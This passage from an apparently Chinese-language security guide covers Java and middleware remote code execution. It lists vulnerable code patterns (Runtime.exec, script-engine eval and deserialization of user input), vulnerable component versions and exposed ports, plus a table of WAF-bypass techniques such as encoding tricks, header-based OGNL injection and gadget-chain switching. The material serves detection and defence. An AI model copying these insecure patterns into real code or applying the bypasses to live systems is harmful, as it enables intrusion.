  - 邮件网关附件解析
```

### 3.3 关键检测信号

**代码层面高危信号**：
```java
// 高危：Runtime.exec 接收用户输入
Runtime.getRuntime().exec(userInput);
Runtime.getRuntime().exec(new String[]{"sh", "-c", userInput});

// 高危：Groovy/脚本引擎执行用户输入
groovyShell.evaluate(userScript);
scriptEngine.eval(userCode);

// 高危：Java 反序列化用户输入
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // 未做类白名单校验

// 高危：ProcessBuilder 拼接用户输入
new ProcessBuilder("bash", "-c", "ls " + userInput).start();
```

**依赖与组件高危信号**：
- Struts2 版本 < 2.5.30（任何已知漏洞版本）
- Apache Commons Collections < 3.2.2 或 < 4.1（反序列化利用链）
- WebLogic 存在 CVE-2020-2551、CVE-2019-2725 等未打补丁
- Apache Solr 启用了 `DataImportHandler`
- JBoss `/invoker/JMXInvokerServlet` 对外暴露
- Apache Druid 无认证对外暴露

**网络/配置高危信号**：
- 中间件管理端口（8080/8161/9090）对外暴露
- IIOP 协议（端口 7001）未禁用
- 大数据组件（Druid/Spark/Presto）无认证对外暴露
- 容器/Kubernetes API Server 对外暴露

### 3.4 常见绕过技巧

| 绕过技巧 | 原理 | 典型场景 |
|---------|------|---------|
| URL 编码（单层/双层） | `%3b`→`;`、`%2524`→`$` 绕过 WAF 字符检测 | Struts2 OGNL |
| Unicode 编码 | `\u0023` → `#` 在 OGNL 解析层被还原 | Struts2 早期版本 |
| Content-Type 注入 | OGNL 注入到 Content-Type 头，绕过 URL 级 WAF | Struts2 S2-045 |
| Content-Disposition 注入 | multipart 请求的文件名字段注入 OGNL | Struts2 银行系统绕过 |
| 利用链切换 | CC1→CC6→CC7 切换绕过类黑名单 | Java 反序列化 |
| 协议替换 | IIOP/T3 替换 HTTP 绕过 HTTP 层防护 | WebLogic RCE |
| 参数注入（非命令注入） | 注入额外的命令行参数而非命令 | `--file-path` 注入 |
| 局域网直接访问 | IoT/移动端设备同网段直接访问 | WebView/摄像头 RCE |
| HTTP 劫持（中间人） | 替换 HTTP 下载内容为恶意文件 | 客户端更新 RCE |
| WAF 未知协议 | 利用 SAP/ERP 特有协议格式绕过通用 WAF | SAP 命令执行 |
